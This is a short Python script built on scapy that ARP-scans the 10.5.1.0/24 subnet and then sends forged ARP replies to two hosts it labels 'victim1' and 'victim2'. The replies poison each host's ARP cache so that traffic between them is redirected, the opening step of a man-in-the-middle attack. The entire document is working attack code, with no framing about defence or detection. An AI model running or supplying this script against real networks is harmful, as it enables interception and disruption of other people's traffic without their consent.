from scapy.all import *
from scapy.all import IP, Ether, ARP, ICMP

frame = Ether(dst="ff:ff:ff:ff:ff:ff")

arp_packet = frame/ARP(pdst="10.5.1.0/24")

IP_MAC_responses, unans = srp(arp_packet, timeout=2)

MAC_on_network = []
IP_on_network = []

for i in range(len(IP_MAC_responses)):
    MAC_on_network.append(IP_MAC_responses[i][1].hwsrc) #to extract MAC
    IP_on_network.append(IP_MAC_responses[i][1].psrc) #to extract IP

print(MAC_on_network    )
print(IP_on_network)

victim1_IP = IP_on_network[1]
victim1_MAC = MAC_on_network[1]

victim2_IP = IP_on_network[2]
victim2_MAC = MAC_on_network[2]

nb_packets = 0
while nb_packets < 100:
    spoof_arp_victim1 = ARP(op=2, psrc=victim2_IP, hwdst=victim1_MAC, pdst=victim1_IP)
    send_spoof1 = sendp(spoof_arp_victim1)
    spoof_arp_victim2 = ARP(op=2, psrc=victim1_IP, hwdst=victim2_MAC, pdst=victim2_IP)
    send_spoof2 = sendp(spoof_arp_victim2)
    nb_packets += 2

print(nb_packets)
